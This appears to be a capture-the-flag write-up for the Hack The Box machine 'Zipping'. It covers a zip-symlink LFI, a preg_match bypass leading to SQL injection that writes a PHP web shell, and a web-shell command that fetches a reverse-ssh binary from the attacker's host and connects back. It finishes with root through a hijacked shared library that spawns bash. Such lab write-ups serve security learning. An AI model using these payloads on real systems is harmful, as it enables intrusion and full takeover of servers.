---
title: Zipping
date: 2023-09-30
categories: [HackThebox, Medium-HTB]
tags: [re, lfi, linux, sqli, mis-config] # TAG names should always be lowercase
---

# Recon

First thing i always do is run this
`curl -s 10.10.11.229 -v 2>&1 | grep "Location"`

to get the host name, in this case it is we got nothing.

## Nmap

```terminal
❯ nmap -sC -sV 10.10.11.229
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 02:08 +08
Nmap scan report for 10.10.11.229
Host is up (0.061s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.76 seconds

```

## Gobuster

```terminal
❯ gobuster dir -u http://10.10.11.229 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.229
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 16738]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.11.229/uploads/]
/shop                 (Status: 301) [Size: 311] [--> http://10.10.11.229/shop/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.229/assets/]
/upload.php           (Status: 200) [Size: 5322]
```

Alright we got webserver running on port 80, after running gobuster we got 3
directories, `/uploads`, `/shop` and `/assets`.

Non of the directories have anything interesting, so i decided to check out the
`/upload.php` endpoint. and voila. we can upload files, but they are restricted
to only `.zip` files. and the extracted file must be a `.pdf` file. At this
point i was thinking of uploading a reverse shell in a zip file, but i was not
sure if it will work. so i decided to check out the `/shop` endpoint.

The endpoint kinda look interesting but i was not sure what to do with it. so i
decided to get back to the `/upload.php` endpoint.

Playing around with the upload.php endpoint, i found out that the file is being
uploaded to `/uploads/{some_random_hash_value}/file.pdf` directory. I spend a
little amount of time here trying to upload a reverse shell in a zip file, but
it did not work. so i decided to google lfi with zip files. and i found this
[HackTricks Page](https://book.hacktricks.xyz/pentesting-web/file-upload/).

```bash
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```

alright lets taste this out.

```bash
❯ ln -s /etc/passwd symindex.pdf
❯ zip --symlinks test.zip symindex.pdf
  adding: symindex.pdf (deflated 60%)
```

I use burp to upload the file. and it worked.

```req
POST /upload.php HTTP/1.1
Host: 10.10.11.229
Content-Length: 460
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.229
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4fdnIVaZFVYSWqpB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.229/upload.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary4fdnIVaZFVYSWqpB
Content-Disposition: form-data; name="zipFile"; filename="test.zip"
Content-Type: application/zip

PK

¹)

¹)
------WebKitFormBoundary4fdnIVaZFVYSWqpB
Content-Disposition: form-data; name="submit"


------WebKitFormBoundary4fdnIVaZFVYSWqpB--

```

## LFI

Alright now we got a lfi. lets try to read the `/etc/passwd` file.

```
HTTP/1.1 200 OK
Date: Wed, 20 Sep 2023 10:36:35 GMT
Server: Apache/2.4.54 (Ubuntu)
Last-Modified: Wed, 20 Sep 2023 10:36:16 GMT
ETag: "56d-605c7f1f8dabe"
Accept-Ranges: bytes
Content-Length: 1389
Connection: close
Content-Type: application/pdf

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false

```

what todo next is prolly try to read the source code of the website. so i tried
to read the `/var/www/html/upload.php` file. and it worked.


### Upload.php
```html
<html>
<html lang="en">
<head>
        <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Start your development with Creative Design landing page.">
    <meta name="author" content="Devcrud">
    <title>Zipping | Watch store</title>

    <!-- font icons -->
    <link rel="stylesheet" href="assets/vendors/themify-icons/css/themify-icons.css">

    <!-- Bootstrap + Creative Design main styles -->
        <link rel="stylesheet" href="assets/css/creative-design.css">

</head>
<body data-spy="scroll" data-target=".navbar" data-offset="40" id="home">
    <!-- Page Header -->
    <header class="header header-mini">
      <div class="header-title">Work with Us</div>
      <nav aria-label="breadcrumb">
         <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="index.php">Home</a></li>
            <li class="breadcrumb-item active" aria-current="page">Work with Us</li>
         </ol>
      </nav>
    </header> <!-- End Of Page Header -->

    <section id="work" class="text-center">
        <!-- container -->
        <div class="container">
            <h1>WORK WITH US</h1>
            <p class="mb-5">If you are interested in working with us, do not hesitate to send us your curriculum.<br> The application will only accept zip files, inside them there must be a pdf file containing your curriculum.</p>

            <?php
            if(isset($_POST['submit'])) {
              // Get the uploaded zip file
              $zipFile = $_FILES['zipFile']['tmp_name'];
              if ($_FILES["zipFile"]["size"] > 300000) {
                echo "<p>File size must be less than 300,000 bytes.</p>";
              } else {
                // Create an md5 hash of the zip file
                $fileHash = md5_file($zipFile);
                // Create a new directory for the extracted files
                $uploadDir = "uploads/$fileHash/";
		$tmpDir = sys_get_temp_dir();
                // Extract the files from the zip
                $zip = new ZipArchive;
                if ($zip->open($zipFile) === true) {
                  if ($zip->count() > 1) {
                  echo '<p>Please include a single PDF file in the archive.<p>';
                  } else {
                  // Get the name of the compressed file
                  $fileName = $zip->getNameIndex(0);
                  if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
                    $uploadPath = $tmpDir.'/'.$uploadDir;
                    echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '>/dev/null');
                    if (file_exists($uploadPath.$fileName)) {
                      mkdir($uploadDir);
                      rename($uploadPath.$fileName, $uploadDir.$fileName);
                    }
                    echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
                  } else {
                    echo "<p>The unzipped file must have  a .pdf extension.</p>";
                  }
                 }
                } else {
                  echo "Error uploading file.";
                }

              }
            }
            ?>

            <!-- Submit File -->
            <form id="zip-form" enctype="multipart/form-data" method="post" action="upload.php">
              <div class="mb-3">
                <input type="file" class="form-control" name="zipFile" accept=".zip">
              </div>
              <button type="submit" class="btn btn-primary" name="submit">Upload</button>
            </form><!-- End submit file -->

        </div><!-- End of Container-->
    </section><!-- End of Contact Section -->
    <!-- Section -->
    <section class="pb-0">
        <!-- Container -->
        <div class="container">
            <!-- Pre footer -->
            <div class="pre-footer">
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">ABOUT US</h6>
                    </li>
                    <li class="list-body">
                      <p>Zipping Co. is a company that is dedicated to producing high-quality watches that are both stylish and functional. We are constantly pushing the boundaries of what is possible with watch design and are known for their commitment to innovation and customer service.</p>
                      <a href="#"><strong class="text-primary">Zipping</strong> <span class="text-dark">Watch Store</span></a>
                    </li>
                </ul>
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">USEFUL LINKS</h6>
                    </li>
                    <li class="list-body">
                        <div class="row">
                            <div class="col">
                                <a href="#">Link 1</a>
                                <a href="#">Link 2</a>
                                <a href="#">Link 3</a>
                                <a href="#">Link 4</a>
                            </div>
                            <div class="col">
                                <a href="#">Link 5</a>
                                <a href="#">Link 6</a>
                                <a href="#">Link 7</a>
                                <a href="#">Link 8</a>
                            </div>
                        </div>
                    </li>
                </ul>
                <ul class="list">
                    <li class="list-head">
                        <h6 class="font-weight-bold">CONTACT INFO</h6>
                    </li>
                    <li class="list-body">
                        <p>Contact us and we'll get back to you within 24 hours.</p>
                        <p><i class="ti-location-pin"></i> 12345 Fake ST NoWhere AB Country</p>
                        <p><i class="ti-email"></i>  info@website.com</p>
                        <div class="social-links">
                            <a href="javascript:void(0)" class="link"><i class="ti-facebook"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-twitter-alt"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-google"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-pinterest-alt"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-instagram"></i></a>
                            <a href="javascript:void(0)" class="link"><i class="ti-rss"></i></a>
                        </div>
                    </li>
                </ul>
            </div><!-- End of Pre footer -->

            <!-- foooter -->
            <footer class="footer">
                <p>Made by <a href="https://github.com/xdann1">xDaNN1</p>
            </footer><!-- End of Footer-->

        </div><!--End of Container -->
    </section><!-- End of Section -->


</body>
</html>
```

### card.php

```php

<?php
// If the user clicked the add to cart button on the product page we can check for the form data
if (isset($_POST['product_id'], $_POST['quantity'])) {
    // Set the post variables so we easily identify them, also make sure they are integer
    $product_id = $_POST['product_id'];
    $quantity = $_POST['quantity'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
        echo '';
    } else {
        // Construct the SQL statement with a vulnerable parameter
        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
        // Execute the SQL statement without any sanitization or parameter binding
        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if ($product && $quantity > 0) {
            // Product exists in database, now we can create/update the session variable for the cart
            if (isset($_SESSION['cart']) && is_array($_SESSION['cart'])) {
                if (array_key_exists($product_id, $_SESSION['cart'])) {
                    // Product exists in cart so just update the quanity
                    $_SESSION['cart'][$product_id] += $quantity;
                } else {
                    // Product is not in cart so add it
                    $_SESSION['cart'][$product_id] = $quantity;
                }
            } else {
                // There are no products in cart, this will add the first product to cart
                $_SESSION['cart'] = array($product_id => $quantity);
            }
        }
        // Prevent form resubmission...
        header('location: index.php?page=cart');
        exit;
    }
}

// Remove product from cart, check for the URL param "remove", this is the product id, make sure it's a number and check if it's in the cart
if (isset($_GET['remove']) && is_numeric($_GET['remove']) && isset($_SESSION['cart']) && isset($_SESSION['cart'][$_GET['remove']])) {

    // Remove the product from the shopping cart
    unset($_SESSION['cart'][$_GET['remove']]);
}

// Update product quantities in cart if the user clicks the "Update" button on the shopping cart page
if (isset($_POST['update']) && isset($_SESSION['cart'])) {
    // Loop through the post data so we can update the quantities for every product in cart
    foreach ($_POST as $k => $v) {
        if (strpos($k, 'quantity') !== false && is_numeric($v)) {
            $id = str_replace('quantity-', '', $k);
            $quantity = (int)$v;
            // Always do checks and validation
            if (is_numeric($id) && isset($_SESSION['cart'][$id]) && $quantity > 0) {
                // Update new quantity
                $_SESSION['cart'][$id] = $quantity;
            }
        }
    }
    // Prevent form resubmission...
    header('location: index.php?page=cart');
    exit;
}

// Send the user to the place order page if they click the Place Order button, also the cart should not be empty
if (isset($_POST['placeorder']) && isset($_SESSION['cart']) && !empty($_SESSION['cart'])) {
    header('Location: index.php?page=placeorder');
    exit;
}

if (isset($_POST['clear'])) {
	unset($_SESSION['cart']);
}

// Check the session variable for products in cart
$products_in_cart = isset($_SESSION['cart']) ? $_SESSION['cart'] : array();
$products = array();
$subtotal = 0.00;
// If there are products in cart
if ($products_in_cart) {
    // There are products in the cart so we need to select those products from the database
    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)
    $array_to_question_marks = implode(',', array_fill(0, count($products_in_cart), '?'));
    $stmt = $pdo->prepare('SELECT * FROM products WHERE id IN (' . $array_to_question_marks . ')');
    // We only need the array keys, not the values, the keys are the id's of the products
    $stmt->execute(array_keys($products_in_cart));
    // Fetch the products from the database and return the result as an Array
    $products = $stmt->fetchAll(PDO::FETCH_ASSOC);
    // Calculate the subtotal
    foreach ($products as $product) {
        $subtotal += (float)$product['price'] * (int)$products_in_cart[$product['id']];
    }
}
?>

<?=template_header('Zipping | Cart')?>

<div class="cart content-wrapper">
    <h1>Shopping Cart</h1>
    <form action="index.php?page=cart" method="post">
        <table>
            <thead>
                <tr>
                    <td colspan="2">Product</td>
                    <td>Price</td>
                    <td>Quantity</td>
                    <td>Total</td>
                </tr>
            </thead>
            <tbody>
                <?php if (empty($products)): ?>
                <tr>
                    <td colspan="5" style="text-align:center;">You have no products added in your Shopping Cart</td>
                </tr>
                <?php else: ?>
                <?php foreach ($products as $product): ?>
                <tr>
                    <td class="img">
                        <a href="index.php?page=product&id=<?=$product['id']?>">
                            <img src="assets/imgs/<?=$product['img']?>" width="50" height="50" alt="<?=$product['name']?>">
                        </a>
                    </td>
                    <td>
                        <a href="index.php?page=product&id=<?=$product['id']?>"><?=$product['name']?></a>
                        <br>
                        <a href="index.php?page=cart&remove=<?=$product['id']?>" class="remove">Remove</a>
                    </td>
                    <td class="price">&dollar;<?=$product['price']?></td>
                    <td class="quantity">
                        <input type="number" name="quantity-<?=$product['id']?>" value="<?=$products_in_cart[$product['id']]?>" min="1" max="<?=$product['quantity']?>" placeholder="Quantity" required>
                    </td>
                    <td class="price">&dollar;<?=$product['price'] * $products_in_cart[$product['id']]?></td>
                </tr>
                <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
        <div class="subtotal">
            <span class="text">Subtotal</span>
            <span class="price">&dollar;<?=$subtotal?></span>
        </div>
        <div class="buttons">
            <input type="submit" value="Update" name="update">
            <input type="submit" value="Place Order" name="placeorder">
	    <input type="submit" value="Clear" name="clear" onsubmit="">
        </div>
    </form>
</div>

<?=template_footer()?>

```

So after looking around in the filesystem, i found the `card.php` file. and it
looks like it is vulnerable to sql injection. so i tried to exploit it.

its kinda of a trick but let me explain. the card.php is like an api, where
things are served based on what the user give, eg in our case, the only we
exploit this app is to bypass the preg_match filter.

Thanks to hacktricks for this explanation on how to bypass the preg_match
filter. u can read more of it here
[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-.)

In simple terms we can bypass it by supplying a `\n` at the beginning of the
payload.

And the second part of the regex requires us to have a number at the end. dont
forget our if statement its an OR operation, so if we have a single false, then
we gonna end up not running the sql injection, therefore we need to have a
number at the end of the payload. aka the filename should end with a number.php
(the extension does not matter, as long as it is a number)

## Initial Foothold

```sql
\n'; select '<?php phpinfo(); ?>' into outfile '/var/lib/mysql/230.php'; --1
```

we use bash to get a urlencode version of this (u need to install `urlencode`)

```bash
echo -n "\n'; select '<?php phpinfo(); ?>' into outfile '/var/lib/mysql/230.php'; --1" | urlencode -c ";"
```

Output -- this gonna be our payload for the sql injection.

```
%0a'%3b+select+'<?php+phpinfo()%3b+?>'+into+outfile+'/var/lib/mysql/230.php'%3b+--1
```

Above payload is basically a testing for the sql injection, since now we're sure
that its working, lets crapt an actual rce payload.

```bash
echo -n "\n'; select '<?php echo \"<pre>\".shell_exec(\$_GET[\"cmd\"]).\"</pre>\";?>' into outfile '/var/lib/mysql/231.php'; --1" | urlencode -c ';?"' | urlencode -c "'<>"
```

sample request to get the rce

```bash
curl -i -s -k -X $'POST' -H $'Cookie: PHPSESSID=3otiofh4e6jbvn6huja1mcdeid' \
-H $'Host: zipping.htb' \
-H $'Cache-Control: max-age=0' \
-H $'Origin: http://zipping.htb' \
-H $'Content-Type: application/x-www-form-urlencoded' \
-H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36' \
-H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
-H $'Connection: close' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'quantity=1&product_id=%0a%27%3b+select+%27%3c%3fphp+echo+%22%3cpre%3e%22.shell_exec($_GET[%22cmd%22]).%22%3c/pre%3e%22%3b%3f%3e%27+into+outfile+%27/var/lib/mysql/270.php%27%3b+--1' $'http://zipping.htb/shop/index.php?page=cart'

```

### User Flag

aight now lets get a proper shell, we gonna use reverse-ssh shell.

```bash
curl '10.10.11.229/shop/index.php?page=/var/lib/mysql/280&cmd=curl+http://10.10.14.39:8000/rev+-o+/dev/shm/rev'

curl '10.10.11.229/shop/index.php?page=/var/lib/mysql/280&cmd=chmod+777+/dev/shm/rev'

curl '10.10.11.229/shop/index.php?page=/var/lib/mysql/280&cmd=/dev/shm/rev+-p+9001+10.10.14.39'

# catch the reverse shell
reverse-ssh -v -l -p 9001
ssh -p 8888 127.0.0.1

#flag
ea47a5**********************9e97f6df462
```

## previlege escalation

As you can see, we are logged in as `rektsu` user. lets check what we can do
with this user.

after running `sudo -l` we can see that we can run `/usr/bin/stock` as root
without password. lets check what this binary does.

lets explore the binary using `ltrace` and see what it does.

```bash
sudo -l

Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock

```

I end up downloading the binary to my local machine and run `ltrace` and
`strace` on it. I got the password from using ltrace, then i run it again strace
now, to see all the syscall

```bash
ltrace ./stock
printf("Enter the password: ")                                                                                               = 20
fgets(Enter the password: sdf "sdf\n", 30, 0x7f929983e8e0)= 0x7ffe01021660
strchr("sdf\n"'\n')= "\n"
strcmp("sdf" "St0ckM4nager")
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
write(1, "\n================== Menu ======="..., 44
```

Alright nice, we got /home/rektsu/.config/libcounter.so been used by the
program. and we have write access to that location, lets try to create a shared
object file and see if we can get a root shell.

```cpp
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
    system("/bin/bash");
}
```

Run the following command to compile the shared object file. then upload it to
the server.

```bash
gcc -shared -fPIC -o libcounter.so libcounter.c
```
### root flag
Running the stock binary again will give us a root shell.

```bash
sudo /usr/bin/stock
cat /root/root.txt

# root flag
99579bbb9***********180903de1
```

In conclusion, this box is pretty fun. i learned a lot of new things. and i hope you guus learned something too. We start with a simple zip file upload, we use symblink to get lfi, reading the source code of the application reveals the possiblity of SqlI on /shop , we utilize the SqlI and get rce, priv esc was kinda easy, we inject .so, since the process is running as root, our .so will be run as well, therefore we craft a shell in the .so file.

Thanks for reading and i hope this helps :)
